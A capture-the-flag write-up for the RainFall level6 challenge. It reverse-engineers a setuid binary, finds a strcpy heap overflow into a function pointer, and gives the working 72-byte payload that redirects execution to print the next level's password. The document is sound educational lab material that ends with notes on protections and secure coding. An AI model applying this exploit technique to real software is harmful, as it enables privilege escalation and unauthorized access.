# Level 6

## Initial Analysis

### 1. Examine the Binary
```bash
level6@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5252 Mar  6  2016 level6
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile

level6@RainFall:~$ file level6
level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x82a8b6794b5a8c4e572b1d643ac0de0184de5984, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **level7** user
- When executed, runs with **level7 privileges**

### 2. Test Basic Execution Behavior
```bash
level6@RainFall:~$ ./level6
Segmentation fault

level6@RainFall:~$ ./level6 hello
Nope

level6@RainFall:~$ ./level6 test_argument
Nope
```

**Critical Observations:**
- **No arguments**: Segmentation fault (tries to access argv[1] when it doesn't exist)
- **With arguments**: Prints "Nope" and exits normally
- **Pattern**: Program expects command-line argument, processes it, calls some function that prints "Nope"

**Key Question**: Where does "Nope" come from? The main function must be calling something that prints this message.

## Reverse Engineering - Understanding the Hidden Architecture

### 3. Function Analysis - Discovering the Complete Picture
```bash
level6@RainFall:~$ gdb level6
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048340  strcpy@plt
0x08048350  malloc@plt      ← Dynamic memory allocation
0x08048360  puts@plt        ← Used for "Nope" output
0x08048370  system@plt      ← System call available!
0x08048454  n               ← Function #1
0x08048468  m               ← Function #2  
0x0804847c  main
```

**Function Discovery Analysis:**
- **Two mysterious functions**: `n()` and `m()`
- **system@plt available**: Suggests one function might call system()
- **puts@plt present**: Likely source of "Nope" message
- **malloc@plt**: Program uses dynamic memory allocation

### 4. Analyzing the Hidden Functions
```bash
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)      # Load command string
   0x08048461 <+13>:    call   0x8048370 <system@plt>  # system() call! 🎯
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret

(gdb) disas m  
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)      # Load message string
   0x08048475 <+13>:    call   0x8048360 <puts@plt>   # puts() call - "Nope"!
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
```

**Hidden Function Analysis:**
- **Function `n()` at 0x08048454**: Calls `system()` - this is our target!
- **Function `m()` at 0x08048468**: Calls `puts()` - source of "Nope" message
- **Discovery**: Program normally calls `m()`, but we want to call `n()`

### 5. Getting Function Addresses
```bash
(gdb) x n
0x8048454 <n>:  0x83e58955

(gdb) x m  
0x8048468 <m>:  0x83e58955
```

**Target Address Confirmed:**
- **Function `n()` address**: `0x08048454`
- **Goal**: Redirect program execution from `m()` to `n()`

## Understanding the Program Architecture

### 6. Main Function Deep Dive - The Heap Allocation Pattern
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp        # Local stack space
   0x08048485 <+9>:     movl   $0x40,(%esp)      # Push 64 (0x40)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>  # malloc(64) 
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)   # Store buffer pointer
   0x08048495 <+25>:    movl   $0x4,(%esp)       # Push 4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>  # malloc(4)
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)   # Store function ptr location
   0x080484a5 <+41>:    mov    $0x8048468,%edx   # Load address of m()!
   0x080484aa <+46>:    mov    0x18(%esp),%eax   # Get function ptr location
   0x080484ae <+50>:    mov    %edx,(%eax)       # Store m() address in heap
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax    # Get argv
   0x080484b3 <+55>:    add    $0x4,%eax         # Point to argv[1]
   0x080484b6 <+58>:    mov    (%eax),%eax       # Dereference argv[1]
   0x080484b8 <+60>:    mov    %eax,%edx         # Source: argv[1]
   0x080484ba <+62>:    mov    0x1c(%esp),%eax   # Destination: buffer
   0x080484be <+66>:    mov    %edx,0x4(%esp)    # Push source
   0x080484c2 <+70>:    mov    %eax,(%esp)       # Push destination
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>  # strcpy()! ⚡
   0x080484ca <+78>:    mov    0x18(%esp),%eax   # Get function ptr location
   0x080484ce <+82>:    mov    (%eax),%eax       # Dereference function ptr
   0x080484d0 <+84>:    call   *%eax             # Call function via pointer!
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
```

**Program Architecture Revelation:**
1. **malloc(64)**: Creates buffer for user input (stored at ESP+28)
2. **malloc(4)**: Creates space for function pointer (stored at ESP+24)  
3. **Function pointer setup**: Stores address of `m()` (0x8048468) in the 4-byte allocation
4. **strcpy() vulnerability**: Copies argv[1] to buffer **without size checking**
5. **Indirect call**: Calls whatever function the pointer references

## The Vulnerability - Heap-Based Buffer Overflow

### 7. Understanding the Memory Layout
```
Heap Memory Layout:

┌─────────────────────────────────────────┐ ← malloc(64) returns pointer
│              Input Buffer               │   (64 bytes allocated)
│        (argv[1] copied here)            │   ← strcpy() destination
│                                         │
│  [User input can overflow this buffer]  │
├─────────────────────────────────────────┤ ← Heap boundary
│                                         │
│         Gap/Heap metadata               │   (size depends on heap layout)
│                                         │
├─────────────────────────────────────────┤ ← malloc(4) returns pointer  
│        Function Pointer                 │   (4 bytes)
│     (Initially: 0x08048468)             │   ← Points to m()
│      (Target: 0x08048454)               │   ← Want to point to n()
└─────────────────────────────────────────┘
```

**The Vulnerability:**
- **strcpy() has no bounds checking** - can write beyond buffer boundaries
- **Source**: argv[1] (user-controlled, unlimited length)
- **Destination**: 64-byte heap buffer
- **Target**: Function pointer in adjacent heap allocation

### 8. Finding the Overflow Offset - De Bruijn Sequence Method
```bash
level6@RainFall:~$ gdb level6
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```

**De Bruijn Sequence Analysis:**
```
Crash address: 0x41346341
Breaking down the bytes:
0x41 = 'A' (ASCII)
0x34 = '4' (ASCII)  
0x63 = 'c' (ASCII)
0x41 = 'A' (ASCII)

Pattern: "Ac4A"
```

**Finding the Offset:**
The De Bruijn sequence is specifically designed so every 4-byte combination appears exactly once. When we crash at `0x41346341` ("Ac4A"), we can count backwards in our pattern to find exactly where this occurs.

**Offset Calculation:**
Looking at the pattern `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4...`, the sequence "Ac4A" appears at position **72 bytes** from the start.

### 9. Confirming the Overflow Point
```bash
level6@RainFall:~$ gdb level6
(gdb) run $(python -c 'print "A"*72 + "BBBB"')
Starting program: /home/user/level6/level6 Aa...AAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

**Overflow Confirmation:**
- **72 bytes of "A"**: Fills buffer and reaches function pointer
- **"BBBB" (0x42424242)**: Overwrites function pointer
- **Crash at 0x42424242**: Confirms we control the function pointer!

## Exploitation Strategy - Function Pointer Hijacking

### 10. The Attack Plan
```
Normal Execution Flow:
strcpy(buffer, argv[1]) → call *function_ptr → m() → puts("Nope")

Exploited Execution Flow:
strcpy(buffer, evil_argv[1]) → call *function_ptr → n() → system()!

Key Components:
1. 72 bytes of filler to reach function pointer
2. Address of n() (0x08048454) to replace m()'s address
3. Little-endian format for x86 architecture
```

### 11. Crafting the Exploit Payload
```bash
# Target: Overwrite function pointer with address of n()
# n() address: 0x08048454
# Little-endian format: \x54\x84\x04\x08

level6@RainFall:~$ python -c 'print "A"*72 + "\x54\x84\x04\x08"'
```

**Payload Breakdown:**
- **"A" * 72**: Filler bytes to reach the function pointer (72 bytes)
- **"\x54\x84\x04\x08"**: Address of function `n()` in little-endian format

### 12. Understanding Little-Endian Byte Order
```
Address of n(): 0x08048454

Big-endian (human readable): 08 04 84 54
Little-endian (x86 format):  54 84 04 08

Why little-endian?
Intel x86 processors store multi-byte values with the least significant byte first.
So 0x08048454 is stored in memory as: 54 84 04 08
```

## Exploitation Implementation

### 13. Execute the Exploit
```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

**Success Analysis:**
1. **Payload delivered**: 72 filler bytes + function address
2. **strcpy() overflow**: Overwrote function pointer with n()'s address
3. **Control hijacked**: Instead of calling m(), program called n()
4. **system() executed**: Function n() ran its system() call
5. **Flag retrieved**: Got the flag for level7

### 14. Why We Got the Flag Instead of a Shell
```bash
(gdb) x/s 0x80485b0
0x80485b0:  "/usr/bin/env echo Congratulations && cat /home/user/level7/.pass"
```

**System Command Analysis:**
- Function `n()` doesn't call `system("/bin/sh")`
- Instead, it runs a specific command that:
  1. Prints "Congratulations" 
  2. Outputs the contents of `/home/user/level7/.pass`
- This explains why we got the flag directly instead of an interactive shell

### 15. Memory State During Exploitation

**Before Overflow:**
```
Heap State:
Input Buffer:    [User input up to 64 bytes........................]
Gap:            [Heap metadata/alignment.........................]  
Function Ptr:   [0x08048468] ← Points to m()
```

**After Overflow:**
```
Heap State:
Input Buffer:    [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (overflow continues...)
Gap:            [AAAAAAAAAAAAAAAAAAA.............................] (overwritten)
Function Ptr:   [0x08048454] ← Now points to n()!
```

**Execution Flow Change:**
```
call *%eax where eax contains:
Before: 0x08048468 → jumps to m() → puts("Nope")
After:  0x08048454 → jumps to n() → system() → flag!
```

## Heap Exploitation Understanding

### 16. Key Concepts Learned

**Heap vs Stack Overflows:**
- **Stack overflow**: Overwrites return addresses, local variables
- **Heap overflow**: Overwrites adjacent heap-allocated data
- **This case**: Heap overflow targeting a function pointer

**Dynamic Memory Allocation Risks:**
- **malloc()** allocates memory in predictable patterns
- **Adjacent allocations** can be vulnerable to overflow
- **No built-in bounds checking** in C string functions

**Function Pointer Attacks:**
- **Indirect calls** (`call *%eax`) use memory-stored addresses
- **Function pointers** become high-value targets for attackers
- **Control flow hijacking** through pointer corruption

### 17. Modern Protections and Bypasses

**Heap Protection Mechanisms:**
- **Heap cookies/canaries**: Detect heap metadata corruption
- **ASLR**: Randomizes heap layout
- **Heap hardening**: Checks for corrupted metadata
- **Control Flow Integrity (CFI)**: Validates indirect calls

**Why This Attack Works:**
- **No ASLR**: Predictable memory addresses
- **No heap cookies**: No corruption detection
- **No CFI**: Indirect calls not validated
- **Legacy system**: Older binary without modern protections

### 18. Secure Coding Practices

**What Went Wrong:**
```c
// Vulnerable code (conceptually):
char *buffer = malloc(64);
char **func_ptr = malloc(4);
*func_ptr = &m;
strcpy(buffer, argv[1]);  // No bounds checking!
(*func_ptr)();           // Calls corrupted pointer
```

**Secure Alternative:**
```c
// Safer approach:
char *buffer = malloc(64);
char **func_ptr = malloc(4);
*func_ptr = &m;
strncpy(buffer, argv[1], 63);  // Bounds checking
buffer[63] = '\0';             // Null termination
(*func_ptr)();                 // Safer call
```

## Vulnerability Analysis Summary

### Root Cause:
- **Unsafe string copying**: `strcpy()` lacks bounds checking
- **Heap layout predictability**: malloc allocations are adjacent and predictable
- **Function pointer vulnerability**: Indirect calls enable control flow hijacking

### Exploitation Technique:
1. **Heap overflow discovery**: Used De Bruijn sequence to find exact offset (72 bytes)
2. **Target identification**: Function `n()` contains desired system() call
3. **Address calculation**: Function `n()` located at 0x08048454
4. **Payload construction**: 72 filler bytes + little-endian function address
5. **Memory corruption**: strcpy() overwrites function pointer in adjacent heap allocation
6. **Control flow hijacking**: Indirect call executes n() instead of m()
7. **Command execution**: system() call retrieves flag with elevated privileges

### Key Learning Points:
1. **Heap overflows** can target adjacent allocations, not just metadata
2. **Function pointers** are critical attack vectors in C programs
3. **malloc() patterns** create predictable memory layouts exploitable by attackers
4. **Input validation** must include bounds checking for all string operations
5. **Indirect calls** require additional security considerations
6. **De Bruijn sequences** provide efficient buffer overflow offset discovery
